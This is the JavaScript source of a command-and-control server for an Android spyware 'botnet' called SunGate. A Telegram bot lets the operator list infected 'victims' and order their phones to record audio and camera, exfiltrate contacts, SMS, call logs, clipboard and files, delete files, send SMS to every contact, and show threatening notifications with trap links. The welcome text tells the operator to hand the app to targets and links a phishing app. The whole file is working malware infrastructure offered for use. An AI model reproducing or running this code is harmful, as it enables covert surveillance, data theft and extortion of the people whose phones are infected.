const express = require('express');
const webSocket = require('ws'); // Included for completeness, but won't work persistently on Vercel
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const config = require('./ctrlll'); // Updated path

const token = config.token;
const id = config.id;
const surya = config.surya; // Unsure if this ID is for a different chat or same as 'id'
const address = config.address; // Used for axios ping, which might be removed

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer}); // WebSocket server setup
const appBot = new telegramBot(token); // Removed polling, will use webhook

// NOTE: These variables will NOT persist across serverless function invocations on Vercel.
// For persistent state, you need an external database.
const appClients = new Map()
let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

const upload = multer();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true })); // Added for handling form data

// Root endpoint for webview
app.get('/', function (req, res) {
    res.send(`
        <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Online</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        body {
            background: #000;
            color: white;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            text-align: center;
            animation: fadeIn 2s ease-in-out;
            position: relative;
            z-index: 1;
        }
        h1 {
            font-size: 32px;
            font-weight: bold;
            color: #00ff00;
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: glitch 1s infinite alternate;
        }
        .status {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
            margin: 15px 0;
            animation: blink 1s infinite alternate;
        }
        p {
            font-size: 18px;
            color: #ccc;
            margin-bottom: 20px;
        }
        .whatsapp-btn {
            display: inline-block;
            background: #25d366;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s ease;
            animation: pulse 1.5s infinite;
        }
        .whatsapp-btn:hover {
            background: #1ebe5d;
            transform: scale(1.1);
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        @keyframes glitch {
            0% { text-shadow: 2px 2px 5px #ff0000, -2px -2px 5px #00ffff; }
            25% { text-shadow: -2px 2px 5px #ff0000, 2px -2px 5px #00ffff; }
            50% { text-shadow: 3px -3px 5px #ff0000, -3px 3px 5px #00ffff; }
            75% { text-shadow: -3px 3px 5px #ff0000, 3px -3px 5px #00ffff; }
            100% { text-shadow: 2px 2px 5px #ff0000, -2px -2px 5px #00ffff; }
        }

        /* Animasi Roket */
        .rocket {
            width: 50px;
            height: auto;
            animation: fly 2s infinite ease-in-out;
            position: relative;
        }
        .rocket svg {
            width: 100%;
            height: auto;
        }
        @keyframes fly {
            0% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(5deg);
            }
            100% {
                transform: translateY(0) rotate(0deg);
            }
        }
    </style>
</head>
<body>
    <canvas id="particles"></canvas>
    <div class="container">
        <div class="rocket">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#00ff00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M4 2v19a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H5a1 1 0 0 0-1 1z" />
                <path d="M12 15l-4-4h8z" />
                <path d="M12 11v4" />
            </svg>
        </div>
        <h1>🚀 Server Telah Online! 🎉</h1>
        <p class="status">🟢 Status: Online</p>
        <p>Terimakasih telah membeli server kami!</p>
        <a href="https://wa.me/6287830372664?text=Halo%20Developer,%20saya%20butuh%20bantuan!" class="whatsapp-btn">Hubungi Developer</a>
    </div>

    <script>
        const canvas = document.getElementById('particles');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particlesArray = [];
        const numberOfParticles = 100;

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 3 + 1;
                this.speedX = Math.random() * 3 - 1.5;
                this.speedY = Math.random() * 3 - 1.5;
                this.color = 'hsl(${Math.random() * 360}, 100%, 50%)';
            }

            update() {
                this.x += this.speedX;
                this.y += this.speedY;

                if (this.size > 0.2) this.size -= 0.05;

                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
            }

            draw() {
                ctx.fillStyle = this.color;
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
            }
        }

        function init() {
            for (let i = 0; i < numberOfParticles; i++) {
                particlesArray.push(new Particle());
            }
        }

        function handleParticles() {
            for (let i = 0; i < particlesArray.length; i++) {
                particlesArray[i].update();
                particlesArray[i].draw();

                if (particlesArray[i].size <= 0.3) {
                    particlesArray.splice(i, 1);
                    i--;
                }
            }
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            handleParticles();
            requestAnimationFrame(animate);
        }

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        init();
        animate();
    </script>
</body>
</html>
    `);
});

// Endpoint for file uploads from client application
app.post("/uploadFile", upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }
    const name = req.file.originalname;
    // Send document to Telegram (this will be part of the webhook handler if bot is on Vercel)
    appBot.sendDocument(id, req.file.buffer, {
            caption: ` NOTIFIKASI TERBARU DARI ${req.headers.model}`},
        {
            filename: name,
            contentType: 'application/txt',
        })
    .then(() => res.send('File received and sent to bot.'))
    .catch(error => {
        console.error("Error sending document to Telegram:", error.message);
        res.status(500).send('Failed to send file to bot.');
    });
});

// Endpoint for text uploads from client application
app.post("/uploadText", (req, res) => {
    if (!req.body || !req.body.text) {
        return res.status(400).send('No text received.');
    }
    let text = req.body['text'];

    // Cek dan ganti teks jika mengandung @shivayadavv
    if (text.includes('@shivayadavv')) {
        text = text.replace(/@shivayadavv/g, '@sisuryaofficialkuu'); // Updated username
    }

    appBot.sendMessage(surya, `✈️ NOTIFIKASI TERBARU DARI ${req.headers.model}\n\n` + text)
    .then(() => res.send('Text received and sent to bot.'))
    .catch(error => {
        console.error("Error sending text to Telegram:", error.message);
        res.status(500).send('Failed to send text to bot.');
    });
});

// Endpoint for location uploads from client application
app.post("/uploadLocation", (req, res) => {
    if (!req.body || !req.body.lat || !req.body.lon) {
        return res.status(400).send('Invalid location data.');
    }
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    .then(() => appBot.sendMessage(id, `°• Lokasi Korban <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"}))
    .then(() => res.send('Location received and sent to bot.'))
    .catch(error => {
        console.error("Error sending location to Telegram:", error.message);
        res.status(500).send('Failed to send location to bot.');
    });
});

// WebSocket connection handling (will not persist on Vercel serverless)
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    // This Map will not persist across Vercel function invocations
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })

    // Send message to Telegram (consider moving this to a stateful service if needed)
    appBot.sendMessage(id,
        `📱𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗕𝗔𝗥𝗨\n\n` +
        `• MODEL HP : <b>${model}</b>\n` +
        `• BATRAI : <b>${battery}</b>\n` +
        `• VERSI : <b>${version}</b>\n` +
        `• SIM AKTIF : <b>${provider}</b>\n\nDev By @sisuryaofficialkuu`, // Updated developer username
        {parse_mode: "HTML"}
    ).catch(console.error);

    ws.on('close', function () {
        // Send message to Telegram (consider moving this to a stateful service if needed)
        appBot.sendMessage(id,
            `📱𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗢𝗨𝗧\n\n` +
        `• MODEL HP : <b>${model}</b>\n` +
        `• BATRAI : <b>${battery}</b>\n` +
        `• VERSI : <b>${version}</b>\n` +
        `• SIM AKTIF : <b>${provider}</b>\n\nDev By @sisuryaofficialkuu`, // Updated developer username
            {parse_mode: "HTML"}
        ).catch(console.error);
        // This deletion will only affect the current, short-lived function instance
        appClients.delete(ws.uuid)
    })
});

// Telegram Webhook endpoint
app.post('/webhook', async (req, res) => {
    const update = req.body;
    try {
        await appBot.processUpdate(update); // Let node-telegram-bot-api handle the update
        res.sendStatus(200); // Important: Acknowledge the update to Telegram
    } catch (error) {
        console.error('Error processing Telegram update:', error);
        res.sendStatus(500); // Send error status if something goes wrong
    }
});

// Moved bot message and callback query handling to a function to be called by webhook
appBot.on('message', async (message) => {
    const chatId = message.chat.id;
    // NOTE: reply_to_message logic will struggle without persistent state.
    // currentUuid, currentNumber, currentTitle will be reset on each new webhook invocation.
    if (message.reply_to_message) {
        // This entire block needs re-thinking for stateless environment
        // The bot will not remember 'currentNumber', 'currentTitle', 'currentUuid'
        // from a previous message/webhook call.
        // You would need a database to store this state.
        if (message.reply_to_message.text.includes('🔥 Masukkan nomor untuk mengirim SMS dari perangkat target')) {
            currentNumber = message.text
            await appBot.sendMessage(id,
                "🔥 Ketik teks pesan\n\n" +
                "⚡ Ketik isi pesan yang akan dikirim ke nomor yang ditentukan",
                {reply_markup: {force_reply: true}}
            );
        } else if (message.reply_to_message.text.includes('🔥 Ketik teks pesan')) {
            // This loop over appClients will be problematic as appClients is not persistent
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('🔥 Ketik pesan untuk dikirim ke semua kontak target')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('🤖 Berikan Saya Jalur Folder Yang Anda Ingin Ambil')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('🔥 Masukkan path file yang ingin dihapus')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('🤖 Berikan Saya Waktu Merekam Suara Korban')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙖𝙢𝙖 𝙬𝙖𝙠𝙩𝙪 𝙮𝙖𝙣𝙜 𝙖𝙣𝙙𝙖 𝙞𝙣𝙜𝙞𝙣𝙠𝙖𝙣 𝙖𝙜𝙖𝙧 𝙠𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖 𝙢𝙚𝙧𝙚𝙠𝙖𝙢')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('🤖 Tulis pesan untuk ditampilkan di tengah layar')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('°• Tuliskan teks ancaman kepada korban')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            await appBot.sendMessage(id,
                '🔥 Tambahin link jebakan atau link apa aja\n\n' +
                '⚡ Pas korban ngeklik pesan, link yang lo masukin bakal kebuka otomatis',
                {reply_markup: {force_reply: true}}
            );
        } else if (message.reply_to_message.text.includes('🔥 Tambahin link jebakan atau link apa aja')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        } else if (message.reply_to_message.text.includes('Kirim tautan musik yang anda inginkan')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            await appBot.sendMessage(id,
                '🤖 Berhasil Menjalankan Tools\n\n' +
                'Dev By @sisuryaofficialkuu',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            const videoUrl = 'https://firebasestorage.googleapis.com/v0/b/suryaofficialku.appspot.com/o/uploads%2Fsungate%2015dtk.mp4?alt=media&token=65ccbe99-b1ce-40f0-b56e-739a8b6de051'; // Video URL
            const caption =
                '🛡️ Selamat Datang di SunGate Botnet 🛡️\n\n' + // Updated bot name
                'SunGate Botnet adalah alat canggih yang dirancang untuk membantu Anda memantau dan mengendalikan perangkat target dengan berbagai fitur keamanan.\n\n' + // Explanation
                'Dengan SunGate, Anda dapat:\n' +
                '• Mengakses informasi perangkat secara real-time.\n' +
                '• Mengambil data penting seperti kontak dan riwayat panggilan.\n' +
                '• Mengontrol fungsi perangkat seperti kamera dan mikrofon.\n' +
                '• Mengirim notifikasi dan pesan kustom ke perangkat target.\n\n' +
                'Kami berkomitmen untuk menyediakan solusi yang kuat dan mudah digunakan untuk kebutuhan Anda.\n\n' +
                'Credits Developer:\n' +
                'Owner: @sisuryaofficial\n' + // Credits
                'Telegram: @sisuryaofficialkuu\n\n' + // Credits
                'Untuk memulai, cukup berikan aplikasi SunGate kepada target Anda dan kendalikan perangkat mereka dari sini.\n\n' +
                'Link Aplikasi Phishing Botnet Ini:\n' +
                'https://t.me/tricksandroid2024/1344'; // Example phishing link

            await appBot.sendVideo(id, videoUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]], // Custom keyboard
                    resize_keyboard: true
                }
            });
        } else if (message.text == '📖 DAFTAR KORBAN') {
            // This logic will be problematic as appClients will not be persistent
            if (appClients.size == 0) {
                await appBot.sendMessage(id,
                    'Maaf Teman 🥲\n\nSepertinya Tidak Ada Korban Yang Menginstal Aplikasi\n' + '~ Untuk Munculkan Korban Silahkan Berikan Aplikasi Ke Target'
                );
            } else {
                let text = 'Ini daftar korban yang berhasil menginstal aplikasi:\n\n';
                appClients.forEach(function (value, key, map) {
                    text += `• Tipe perangkat : <b>${value.model}</b>\n` +
                        `• baterai : <b>${value.battery}</b>\n` +
                        `• versi Android : <b>${value.version}</b>\n` +
                        `• Tipe jaringan : <b>${value.provider}</b>\n\n`;
                });
                await appBot.sendMessage(id, text, {parse_mode: "HTML"});
            }
        } else if (message.text == '☠️ SADAP KORBAN') {
            // This logic will be problematic as appClients will not be persistent
            if (appClients.size == 0) {
                await appBot.sendMessage(id,
                    'Maaf Teman 🥲\n\nSepertinya Tidak Ada Korban Yang Menginstal Aplikasi\n' + '~ Untuk Munculkan Korban Silahkan Berikan Aplikasi Ke Target'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                await appBot.sendMessage(id, 'Pilih Korban Yang Anda Ingin Retas', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        await appBot.sendMessage(id, 'Jika Mengalami Bug Anda Bisa Report Ke @sisuryaofficialkuu'); // Updated developer username
    }
});

appBot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    // NOTE: This entire block also relies on currentUuid and appClients
    // which will not be persistent. You need a database to store and retrieve
    // the current uuid associated with the chat/user.

    if (commend == 'device') {
        // appClients.get(data.split(':')[1]) will not work if appClients is not persistent
        const clientInfo = appClients.get(data.split(':')[1]) || { model: 'Unknown Device' };
        await appBot.editMessageText(`Pilih Fitur Yang Anda Ingin Gunakan Untuk Sadap Prangkat : <b>${clientInfo.model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🇩‌🇪‌🇻‌🇮‌🇨‌🇪‌ - 🇲‌🇪‌🇳‌🇺‌',
                            url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
                        }
                    ],
                    [
                        {text: 'ᴀᴘʟɪᴋᴀsɪ', callback_data: `apps:${uuid}`},
                        {text: 'ɪɴғᴏ ʜᴘ', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'ʟᴏᴋᴀsɪ', callback_data: `location:${uuid}`},
                        {text: 'ᴛᴇᴋs ʟᴀʏᴀʀ', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'ʀɪᴡᴀʏᴀᴛ ᴛᴇʟᴘ', callback_data: `calls:${uuid}`},
                        {text: 'ᴋᴏɴᴛᴀᴋ', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {
                            text: '🇫‌🇮‌🇱‌🇪‌ - 🇲‌🇪‌🇳‌🇺‌‌',
                            url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
                        }
                    ],
                    [
                        {text: 'ᴀᴍʙɪʟ ғɪʟᴇ', callback_data: `file:${uuid}`},
                        {text: 'ʜᴀᴘᴜs ғɪʟᴇ', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {
                            text: '🇩‌🇪‌🇫‌🇦‌𝐔‌🇱‌🇹‌ - 🇲‌🇪‌🇳‌🇺‌‌‌‌',
                            url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
                        }
                    ],
                    [
                        {text: 'ᴛᴇᴋs ᴄᴏᴘʏ', callback_data: `clipboard:${uuid}`},
                        {text: 'ʀᴇᴋᴀᴍ sᴜᴀʀᴀ', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'ᴋᴀᴍᴇʀᴀ ʙᴇʟᴀᴋᴀɴɢ', callback_data: `camera_main:${uuid}`},
                        {text: 'ᴋᴀᴍᴇʀᴀ ᴅᴇᴘᴀɴ', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'ᴋɪʀɪᴍ ɢᴇᴛᴀʀᴀɴ', callback_data: `vibrate:${uuid}`},
                        {text: 'ʙᴜᴀᴛ ɴᴏᴛɪғɪᴋᴀsɪ', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {
                            text: '🇸‌🇴‌𝐔‌🇳‌🇩‌ - 🇲‌🇪‌🇳‌🇺‌',
                            url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
                        }
                    ],
                    [
                        {text: 'ʙᴇʀɪᴋᴀɴ sᴏᴜɴᴅ', callback_data: `play_audio:${uuid}`},
                        {text: 'ʙᴇʀʜᴇɴᴛɪ sᴏᴜɴᴅ', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '🇸‌🇲‌🇸‌ - 🇲‌🇪‌🇳‌🇺‌',
                            url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
                        }
                    ],
                    [
                        {
                            text: 'sᴍs ᴛᴇʀʙᴀʀᴜ & ᴅᴜʟᴜ',
                            callback_data: `messages:${uuid}` //
                        }
                    ],
                    [
                        {
                            text: 'ᴋɪʀɪᴍ sᴍs ᴋᴇ sᴇᴍᴜᴀ ᴋᴏɴᴛᴀᴋ',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {
                            text: '🇮‌🇳‌🇫‌🇴‌🇲‌🇦‌🇸‌𝗜‌ 🇩‌🇪‌🇻‌🇪‌🇱‌🇴‌𝗣‌𝗘‌𝗥‌ ',
                            url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
                        }
                    ],
                    [
                        {
                            text: '𝙾𝚆𝙽𝙴𝚁 𝙱𝚈 @sisuryaofficialkuu', // Updated developer username
                            url: `https://t.me/sisuryaofficialkuu` // Updated developer URL
                        }
                    ],
                    [
                        {
                            text: 'CHANNEL UPDATE',
                            url: `https://t.me/tricksandroid2024`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        });
    } else {
        // Handle other commands
        // All these commands send something to `ws.send`, which relies on `appSocket.clients`
        // and `currentUuid` (if used in reply_to_message flow), both are problematic on Vercel.
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send(commend); // Send the command directly
            }
        });
        await appBot.deleteMessage(id, msg.message_id).catch(console.error);
        await appBot.sendMessage(id,
            '🤖 Berhasil Menjalankan Tools\n\n' +
            'Dev By @sisuryaofficialkuu',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
                    'resize_keyboard': true
                }
            }
        ).catch(console.error);
    }
});

// The setInterval for axios ping is suitable for a traditional server,
// but for Vercel serverless, each function invocation is short-lived.
// This means the ping will only happen when a request comes in, not continuously.
// If your 'address' is your Vercel deployment, this could help keep the function warm,
// but it's not a reliable way to keep a bot running.
// Removed for a cleaner serverless setup.
// setInterval(function () {
//     appSocket.clients.forEach(function each(ws) {
//         ws.send('ping')
//     });
//     try {
//         axios.get(address).then(r => "")
//     } catch (e) {
//         console.error("Error pinging address:", e.message);
//     }
// }, 5000)

// Listen on the port provided by Vercel (process.env.PORT) or a default
appServer.listen(process.env.PORT || 3000, () => {
    console.log(`Server is listening on port ${process.env.PORT || 3000}`);
});
